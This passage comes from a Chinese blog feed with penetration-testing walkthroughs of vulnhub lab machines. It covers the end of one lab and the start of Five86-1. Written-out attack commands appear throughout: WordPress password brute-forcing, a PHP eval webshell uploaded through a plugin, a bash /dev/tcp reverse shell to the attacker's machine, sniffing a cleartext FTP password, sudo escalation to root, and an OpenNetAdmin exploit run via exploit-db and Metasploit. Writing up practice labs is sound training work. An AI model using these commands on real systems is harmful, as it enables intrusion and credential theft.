title="2)制作字典"></a>2)制作字典</h4><p>把用户名写到一个文本中，用来暴破</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113213738684.png" alt="image-20240113213738684"></p><p>由于 kali 自带的字典太大了，这里导出前 3 万行用来当字典</p><pre class="line-numbers language-none"><code class="language-none">cd &#x2F;usr&#x2F;share&#x2F;wordlistshead -30000 rockyou.txt &gt; MS02423.txtrockyou.txt.gz第一次是一个压缩包，需要我们进行解压gzip -c -d rockyou.txt.gz &gt; rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113214810520.png" alt="image-20240113214810520"></p><p>使用 wpscan 暴破，得到两个账户的信息，-U 为暴破用户名的字典，-P 为暴破密码的字典(由于字典比较大，所以爆破时间比较长)我这里爆破了40分钟</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan <span class="token parameter variable">--url</span> http://192.168.52.133 <span class="token parameter variable">-U</span> /root/users.txt  <span class="token parameter variable">-P</span> MS02423.txt <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113214858239.png" alt="image-20240113214858239"></p><p>得到两个账户的信息<br> barney&#x2F;spooky1，stephen&#x2F;apollo1</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113230720023.png" alt="image-20240113230720023"></p><h4 id="3-登录"><a href="#3-登录" class="headerlink" title="3)登录"></a>3)登录</h4><p>我们登录 barney&#x2F;spooky1，可以发现3个插件我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114201635955.png" alt="image-20240114201635955"></p><p>第三个插件，大概意思是我们可以插入内容，这里我们使用一句话木马即可</p><p>在谷歌上搜索一下，不难搜到这个插件的RCE：WordPress插件IEAC漏洞分析及组合利用尝试，在exploit-db上也有</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">先生成poc.zip，<span class="token builtin class-name">echo</span> <span class="token string">"hello"</span> <span class="token operator">></span> index.html<span class="token builtin class-name">echo</span> <span class="token string">""</span> <span class="token operator">></span> index.php<span class="token function">zip</span> poc.zip index.html index.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114201931528.png" alt="image-20240114201931528"></p><p>这个我们先放一放，我们查看另一个用户</p><p>stephen&#x2F;apollo1</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114202159521.png" alt="image-20240114202159521"></p><p>我们可以看到没有任何东西，那么我们就可以一句话木马</p><h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="(4)漏洞利用"></a>(4)漏洞利用</h3><h4 id="1-制作一句话木马"><a href="#1-制作一句话木马" class="headerlink" title="1)制作一句话木马"></a>1)制作一句话木马</h4><p>先创建一个文件夹，在文件夹里创建php和html文件,php文件里写入一句话，html随便写，只要能看到内容就可以</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> MS02423<span class="token function">vim</span> <span class="token number">1</span>.php<span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'MS02423'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token comment"># php文件</span><span class="token function">vim</span> <span class="token number">1</span>.html<span class="token operator">&lt;</span>h<span class="token operator"><span class="token file-descriptor important">1</span>></span>test<span class="token operator">&lt;</span>/h<span class="token operator"><span class="token file-descriptor important">1</span>></span><span class="token function">zip</span> <span class="token parameter variable">-r</span> MS02423.zip <span class="token number">1</span>.php <span class="token number">1</span>.html<span class="token comment"># html文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114204105677.png" alt="image-20240114204105677"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114204139513.png" alt="image-20240114204139513"></p><p>在Posts—&gt;Add New，点击＋号，选择e-Learing，点击UPLOAD</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114204905184.png" alt="image-20240114204905184"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114204526530.png" alt="image-20240114204526530"></p><p>点击CHOOSE YOUR ZIP FILE选择上传的压缩包，然后点击旁边的UPLOAD</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114204540741.png" alt="image-20240114204540741"></p><p>然后访问</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.52.133&#x2F;wp-content&#x2F;uploads&#x2F;articulate_uploads&#x2F;MS02423&#x2F;1.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 访问到上传文件夹里的html文件即可，url中的MS02423是上传文件夹的名称</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114204644417.png" alt="image-20240114204644417"></p><h4 id="2-连接蚁剑"><a href="#2-连接蚁剑" class="headerlink" title="2)连接蚁剑"></a>2)连接蚁剑</h4><p>然后使用蚁剑连接文件夹中的1.php文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.133/wp-content/uploads/articulate_uploads/MS02423/1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114205423286.png" alt="image-20240114205423286"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114205447352.png" alt="image-20240114205447352"></p><p>我们可以看到连接成功</p><h4 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3)反弹shell"></a>3)反弹shell</h4><p>kali监听</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvp</span> <span class="token number">666666</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114210159296.png" alt="image-20240114210159296"></p><p>我们修改1.php内容</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'MS02423'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bash -c 'bash -i >&amp; /dev/tcp/192.168.52.152/666666 0>&amp;1'"</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114210039405.png" alt="image-20240114210039405"></p><p>我们访问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">192.168</span>.52.133/wp-content/uploads/articulate_uploads/MS02423/1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到反弹成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114210130063.png" alt="image-20240114210130063"></p><p>获取交互式shell，这里python不行会报错，需要python3</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-c</span> <span class="token string">'import pty;pty.spawn("/bin/sh")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114210657326.png" alt="image-20240114210657326"> </p><p>执行sudo -l时提示需要密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114210722236.png" alt="image-20240114210722236"></p><p>看了一圈也没什么有用的，很多命令没权限，切换到stephen账户</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114211015195.png" alt="image-20240114211015195"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114211227887.png" alt="image-20240114211227887"></p><h4 id="4-查看ftp服务"><a href="#4-查看ftp服务" class="headerlink" title="4)查看ftp服务"></a>4)查看ftp服务</h4><p>还是没什么东西，扫描的时候还发现了ftp服务，发现有ftp的进程，属paul用户</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114212236702.png" alt="image-20240114212236702"></p><p>ftp是明文传输，进程执行的脚本文件看执行命令应该是个定时任务，尝试抓下包,要确定抓哪个网卡的流量，查看下网卡信息，ifconfig这里用不了，可以用ip add,veth是虚拟网卡，br可能是桥接网卡，veth的master是br，类似冗余链路，这里就抓master网卡，也就是br网卡</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114212345906.png" alt="image-20240114212345906"></p><p>用tcpdump抓br网卡的包<br> -D查看可监听网卡，timeout抓包时间，-w生成文件，-i网卡，-r读取pcap包<br> (如果一直抓不到包的话，可以重启下靶机)</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tcpdump <span class="token parameter variable">-D</span><span class="token function">timeout</span> <span class="token number">120</span> tcpdump <span class="token parameter variable">-w</span> MS02423.pcap <span class="token parameter variable">-i</span> br-eca3858d86bftcpdump <span class="token parameter variable">-r</span> MS02423.pcap<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114213213377.png" alt="image-20240114213213377"></p><p>把包的内容复制出来，发现有PASS字段，搜索PASS，发现密码esomepasswford</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114213407806.png" alt="image-20240114213407806"></p><h3 id="5-提升权限"><a href="#5-提升权限" class="headerlink" title="(5)提升权限"></a>(5)提升权限</h3><p>我们登录paul用户，使用命令sudo -l</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114214511349.png" alt="image-20240114214511349"></p><p>发现可以免密执行peter用户的service命令</p><p>通过service命令进行提权，获取到peter用户权限， 直接&#x2F;bin&#x2F;bash会报错，不知道具体的路径，使用相对路径</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-u</span> peter <span class="token function">service</span> <span class="token punctuation">..</span>/<span class="token punctuation">..</span>/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114214830549.png" alt="image-20240114214830549"></p><p>再次sudo -l发现可以免密执行root的passwd命令<br> 更改root账户的密码后，登录到root账户</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-u</span> root <span class="token function">passwd</span> rootMS02423<span class="token function">su</span> rootMS02423<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114215115196.png" alt="image-20240114215115196"></p><p>我们切换到root目录下，即可看到flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114215252628.png" alt="image-20240114215252628"></p><h1 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.dirsearch目录扫描</p><p>9.wpscan工具的使用</p><p>10.蚁剑的使用</p><p>11.ftp服务</p><p>12.kali自带字典</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之Five86-1</title>
    <link href="http://ms02423.top/2024/01/10/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFive86-1/"/>
    <id>http://ms02423.top/2024/01/10/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFive86-1/</id>
    <published>2024-01-10T08:22:14.000Z</published>
    <updated>2024-01-13T09:39:42.517Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Five86-1 <span class="token keyword">is</span> another purposely built vulnerable lab <span class="token keyword">with</span> the intent <span class="token keyword">of</span> gaining experience <span class="token keyword">in</span> the world <span class="token keyword">of</span> penetration testing<span class="token punctuation">.</span>The ultimate goal <span class="token keyword">of</span> this challenge <span class="token keyword">is</span> <span class="token keyword">to</span> get root <span class="token operator">and</span> <span class="token keyword">to</span> <span class="token keyword">read</span> the one <span class="token operator">and</span> only flag<span class="token punctuation">.</span>Linux skills <span class="token operator">and</span> familiarity <span class="token keyword">with</span> the Linux command <span class="token keyword">line</span> <span class="token keyword">are</span> a must<span class="token punctuation">,</span> <span class="token keyword">as</span> <span class="token keyword">is</span> some experience <span class="token keyword">with</span> basic penetration testing tools<span class="token punctuation">.</span><span class="token keyword">For</span> beginners<span class="token punctuation">,</span> Google can be <span class="token keyword">of</span> great assistance<span class="token punctuation">,</span> but you can always tweet me <span class="token keyword">at</span> @DCAU7 <span class="token keyword">for</span> assistance <span class="token keyword">to</span> get you going again<span class="token punctuation">.</span> But take note<span class="token punctuation">:</span> I wo<span class="token string">n't give you the answer, instead, I'</span>ll give you an idea about how <span class="token keyword">to</span> <span class="token keyword">move</span> forward<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>只有一个flag</p><h2 id="2-靶场地址"><a href="#2-靶场地址" class="headerlink" title="2.靶场地址"></a>2.靶场地址</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>five86-1<span class="token punctuation">,</span><span class="token number">417</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110164851637.png" alt="image-20240110164851637"></p><h2 id="3-启动环境"><a href="#3-启动环境" class="headerlink" title="3.启动环境"></a>3.启动环境</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110164800256.png" alt="image-20240110164800256"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.52.0&#x2F;24</p><h1 id="二-渗透测试"><a href="#二-渗透测试" class="headerlink" title="二.渗透测试"></a>二.渗透测试</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.52.0&#x2F;24</p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="(1)寻找靶场真实ip"></a>(1)寻找靶场真实ip</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.52.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110165223225.png" alt="image-20240110165223225"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110165420001.png" alt="image-20240110165420001"></p><p>靶场真实ip地址为192.168.52.132</p><h3 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="(2)探测端口及服务"></a>(2)探测端口及服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-A</span> <span class="token parameter variable">-v</span> -p- <span class="token number">192.168</span>.52.132<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110165739019.png" alt="image-20240110165739019"></p><pre class="line-numbers language-none"><code class="language-none">发现开启了22端口， OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)发现开启了80端口，Apache httpd 2.4.38 ((Debian))发现开启了10000端口，MiniServ 1.920 (Webmin httpd)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>MiniServ服务我是第一次见，百度一下</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110205153717.png" alt="image-20240110205153717"></p><p>也可以使用masscan进行探测</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">masscan <span class="token parameter variable">--rate</span><span class="token operator">=</span><span class="token number">10000</span> <span class="token parameter variable">--ports</span> <span class="token number">0</span>-65535 <span class="token number">192.168</span>.52.132<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110170020295.png" alt="image-20240110170020295"></p><h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb <span class="token parameter variable">-v</span> <span class="token number">192.168</span>.52.132<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110170415130.png" alt="image-20240110170415130"></p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="(1)访问web服务"></a>(1)访问web服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.132<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110203640342.png" alt="image-20240110203640342"></p><p>没有任何东西</p><p>还有一个10000端口，我们进行访问<a href="http://192.168.52.132:10000/">http://192.168.52.132:10000</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110210030984.png" alt="image-20240110210030984"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110210041105.png" alt="image-20240110210041105"></p><p>访问发现了登录界面，但是这里初步尝试了SQL注入漏洞，失败了。这里使用暴力破解难度还是很大的，并且极其花费时间且需要一个足够强大的字典文件，果断放弃爆破，继续收集有用信息</p><h3 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="(2)扫描web服务"></a>(2)扫描web服务</h3><h4 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.52.132<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110204120425.png" alt="image-20240110204120425"></p><h4 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.52.132<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110204525706.png" alt="image-20240110204525706"></p><p>我们扫描到一个robots.txt文件，我们进行访问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.132/robots.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看到一个&#x2F;noa</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110204401574.png" alt="image-20240110204401574"></p><p>我们进行访问<a href="http://192.168.52.132/noa/,%E4%B9%8B%E5%89%8D%E4%B8%80%E7%9B%B4%E9%83%BD%E6%B2%A1%E9%81%87%E5%88%B0%E8%BF%87%E8%BF%99%E7%A7%8D%E9%A1%B5%E9%9D%A2%EF%BC%8C%E7%99%BE%E5%BA%A6%E6%9F%A5%E8%AF%A2%E4%B8%80%E4%B8%8Bopennetadmin">http://192.168.52.132/noa/,之前一直都没遇到过这种页面，百度查询一下opennetadmin</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110204432319.png" alt="image-20240110204432319"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110205527550.png" alt="image-20240110205527550"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110205541731.png" alt="image-20240110205541731"></p><p>查看一下版本信息，发现是18.1.1版本</p><h4 id="3-dirsearch目录扫描"><a href="#3-dirsearch目录扫描" class="headerlink" title="3)dirsearch目录扫描"></a>3)dirsearch目录扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.52.132 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110205859600.png" alt="image-20240110205859600"></p><p>没有如何新的信息</p><h3 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="(3)漏洞利用"></a>(3)漏洞利用</h3><h4 id="1-搜索漏洞"><a href="#1-搜索漏洞" class="headerlink" title="1)搜索漏洞"></a>1)搜索漏洞</h4><p>打开漏洞库<a href="https://www.exploit-db.com/%EF%BC%8C%E6%90%9C%E7%B4%A2%E6%9C%89%E6%97%A0%E8%AF%A5%E8%BD%AF%E4%BB%B6%E5%AF%B9%E5%BA%94%E7%89%88%E6%9C%AC%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6">https://www.exploit-db.com/，搜索有无该软件对应版本的漏洞利用文件</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110210345265.png" alt="image-20240110210345265"></p><p>成功搜索到2个对应版本漏洞利用文件</p><h4 id="2-kali搜索漏洞"><a href="#2-kali搜索漏洞" class="headerlink" title="2)kali搜索漏洞"></a>2)kali搜索漏洞</h4><p> 在kali里面查询有无该版本的漏洞利用文件，如果有的话，直接就可利用</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110210838654.png" alt="image-20240110210838654"></p><p>找到了，并且RCE也对应上了,进入该目录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /usr/share/exploitdb/exploits/php/webapps<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 然后执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./47691.sh http://192.168.52.132/ona/login.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110212306274.png" alt="image-20240110212306274"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110212330406.png" alt="image-20240110212330406"></p><p>我们可以看到攻击成功了，这里我们还可以使用另一个方法msfconsole进行攻击</p><h4 id="3-msfconsole进行攻击"><a href="#3-msfconsole进行攻击" class="headerlink" title="3)msfconsole进行攻击"></a>3)msfconsole进行攻击</h4><p>我们进行漏洞搜索</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search opennetadmin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110220224839.png" alt="image-20240110220224839"></p><p>直接输入漏洞利用文件路径进行使用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110220249481.png" alt="image-20240110220249481"></p><p>查看需要配置那些参数</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110220328080.png" alt="image-20240110220328080"></p><p>设置对应参数</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.52.132  （目标靶机IP地址）<span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.52.152   （本机IP地址）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110220404471.png" alt="image-20240110220404471"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110220430380.png" alt="image-20240110220430380"></p><p>我们进行攻击</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110220654257.png" alt="image-20240110220654257"></p><p>攻击成功</p><h3 id="4-提权"><a href="#4-提权" class="headerlink" title="(4)提权"></a>(4)提权</h3><h4 id="1-使用python切换至交互式shell"><a href="#1-使用python切换至交互式shell" class="headerlink" title="1)使用python切换至交互式shell"></a>1)使用python切换至交互式shell</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">shellpython <span class="token parameter variable">-c</span> <span class="token string">'import pty;pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110220732262.png" alt="image-20240110220732262"></p><p>我们进行搜集信息，一般情况下我们查看&#x2F;var&#x2F;www&#x2F;html&#x2F;路径文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113162441485.png" alt="image-20240113162441485"></p><p>我们查看两个文件，一个是robots.txt，一个是reports，但是都没有用</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113162720372.png" alt="image-20240113162720372"></p><p>我们查看隐藏文件，在reports目录中，发现了 .htaccess 隐藏文件，隐藏文件一般都会有提示信息，查看一下</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113162824178.png" alt="image-20240113162824178"></p><p>是一个提示文件，提示我们&#x2F;var&#x2F;www&#x2F;.htpasswd</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113162951000.png" alt="image-20240113162951000"></p><p><strong>是一个用户的账户密码，提示密码10位数且只有</strong>aefhrt**这些字符，那我们可以使用crunch生成密码字典</p><h4 id="2-crunch生成密码"><a href="#2-crunch生成密码" class="headerlink" title="2)crunch生成密码"></a>2)crunch生成密码</h4><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113163218040.png" alt="image-20240113163218040"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crunch <span class="token number">10</span> <span class="token number">10</span> aefhrt <span class="token parameter variable">-o</span> /home/kali/桌面/MS02423.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Crunch是一种创建密码字典工具，按照指定的规则生成密码字典，可以灵活的制定自己的字典文件。使用Crunch工具生成的密码可以输出到屏幕，保存到文件、或另一个程序。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113163902653.png" alt="image-20240113163902653"></p><p>成功在指定路径生成了密码字典文件，接下来再把<strong>douglas</strong>用户的密码保存到另外一个文件中，文件路径为：&#x2F;root&#x2F;user.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113164111098.png" alt="image-20240113164111098"></p><h4 id="3-john爆破密码"><a href="#3-john爆破密码" class="headerlink" title="3)john爆破密码"></a>3)john爆破密码</h4><p>使用john爆破用户名密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">john <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/home/kali/桌面/MS02423.txt  /home/kali/桌面/user.txt   <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆破的时候突然卡住了，我把<strong>douglas</strong>用户的密码保存在了桌面上，爆破速度有点慢</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113170245868.png" alt="image-20240113170245868"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113170435451.png" alt="image-20240113170435451"></p><p>爆破得到密码：fatherrrrr</p><h4 id="4-ssh公匙免密登录jen用户"><a href="#4-ssh公匙免密登录jen用户" class="headerlink" title="4)ssh公匙免密登录jen用户"></a>4)ssh公匙免密登录jen用户</h4><p>首先我们切换到douglas用户名，我们查看权限</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113170825632.png" alt="image-20240113170825632"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113171120070.png" alt="image-20240113171120070"></p><p>发现可以使用cp命令使用<strong>jen</strong>用户权限免密执行，同时在<strong>douglas</strong>根目录下，看到隐藏文件**.ssh**</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113171358887.png" alt="image-20240113171358887"></p><p>进入.ssh目录，发现是ssh公钥</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113171438974.png" 